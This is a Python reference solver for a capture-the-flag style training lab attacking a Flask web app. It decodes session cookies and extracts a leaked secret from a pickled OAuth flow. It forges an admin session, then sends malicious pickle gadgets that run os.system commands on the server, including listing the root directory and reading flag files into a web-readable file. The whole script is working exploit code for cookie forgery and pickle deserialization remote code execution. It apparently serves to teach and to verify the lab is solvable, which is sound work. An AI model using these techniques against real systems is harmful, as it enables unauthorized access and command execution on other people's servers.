#!/usr/bin/env python3
"""Reference solver for the Pickled Cookie Lab.  *** SPOILERS ***

Try the lab by hand first. This script is here to check your understanding
and to verify that a fresh build of the lab is solvable.

    pip install flask requests
    python3 solve.py http://192.168.60.1:8888
    python3 solve.py http://192.168.60.1:8888 --timing   # also run the sleep proof
"""
import argparse
import base64
import json
import os
import pickle
import pickletools
import re
import sys
import time
import zlib

import requests
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

COOKIE = "nimbus_session"
FLAG_RE = re.compile(r"FLAG\{[a-z]+_[0-9a-f]+\}")


def step(msg):
    print(f"\n[+] {msg}")


# --- Stage 1: recon -----------------------------------------------------

def get_fresh_cookie(base):
    r = requests.get(f"{base}/auth/login", allow_redirects=False, timeout=10)
    return r.cookies[COOKIE]


def decode_cookie(cookie):
    """Decode a Flask session cookie WITHOUT knowing the key.

    Format: [.]<base64 payload>.<base64 timestamp>.<base64 signature>
    A leading '.' means the payload is zlib-compressed.
    """
    compressed = cookie.startswith(".")
    payload = cookie.lstrip(".").split(".")[0]
    data = base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4))
    if compressed:
        data = zlib.decompress(data)
    return json.loads(data)


def pickle_strings(blob):
    """List the strings in a pickle without executing it.

    Never pickle.loads() data you don't trust, not even on your own box.
    pickletools reads the opcodes without running them.
    """
    return [arg for op, arg, _ in pickletools.genops(blob) if isinstance(arg, str)]


# --- Stage 2: forge -----------------------------------------------------

def serializer_for(secret):
    app = Flask("forge")
    app.secret_key = secret
    return SecureCookieSessionInterface().get_signing_serializer(app)


# --- Stage 3: RCE -------------------------------------------------------

class Exec:
    """When unpickled, calls os.system(cmd). That's all a pickle RCE is."""

    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))


class Sleep:
    def __init__(self, seconds):
        self.seconds = seconds

    def __reduce__(self):
        return (time.sleep, (self.seconds,))


def fire(base, signer, gadget):
    forged = signer.dumps({
        "csrf_token": "x",
        "oauth_flows": {"x": pickle.dumps(gadget)},
    })
    start = time.monotonic()
    r = requests.get(f"{base}/auth/callback", cookies={COOKIE: forged}, timeout=60)
    return r, time.monotonic() - start


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("base", help="e.g. http://192.168.60.1:8888")
    ap.add_argument("--timing", action="store_true", help="run the sleep() proof too")
    args = ap.parse_args()
    base = args.base.rstrip("/")

    step("Stage 1: grab an unauthenticated session cookie from /auth/login")
    cookie = get_fresh_cookie(base)
    print(f"    {len(cookie)} bytes: {cookie[:60]}...")

    session = decode_cookie(cookie)
    print("    decoded:", json.dumps(session)[:200], "...")

    csrf = session["csrf_token"]
    blob = base64.b64decode(session["oauth_flows"][csrf][" b"])  # Flask's bytes tag
    strings = pickle_strings(blob)
    print("    strings inside the pickled flow:", strings)

    secret = strings[strings.index("client_secret") + 1]
    flag1 = next(s for s in strings if FLAG_RE.fullmatch(s))
    print(f"    client_secret = {secret}")
    print(f"    FLAG 1: {flag1}")

    step("Stage 2: is the OAuth client secret also Flask's SECRET_KEY?")
    signer = serializer_for(secret)
    signer.loads(cookie)  # raises BadSignature if not
    print("    yes: the cookie's signature verifies with it")

    forged = signer.dumps({"user": {"email": "you@lab", "name": "you", "role": "admin"}})
    r = requests.get(f"{base}/admin", cookies={COOKIE: forged}, timeout=10)
    print(f"    FLAG 2: {FLAG_RE.search(r.text).group()}")

    step("Stage 3: forge a session whose 'flow' is a malicious pickle")
    if args.timing:
        for secs in (0, 3, 6):
            r, took = fire(base, signer, Sleep(secs))
            print(f"    sleep({secs}) -> HTTP {r.status_code} in {took:.1f}s")

    out = "/app/static/cache/.x.txt"
    r, _ = fire(base, signer, Exec(f"(id; ls -la /; cat /flag_*.txt) > {out} 2>&1"))
    print(f"    callback answered HTTP {r.status_code} (the error page is expected)")
    loot = requests.get(f"{base}/static/cache/.x.txt", timeout=10).text
    print("    command output:\n" + "\n".join("      " + l for l in loot.splitlines()))
    print(f"    FLAG 3: {FLAG_RE.search(loot).group()}")

    fire(base, signer, Exec(f"rm -f {out}"))  # tidy up


if __name__ == "__main__":
    sys.exit(main())
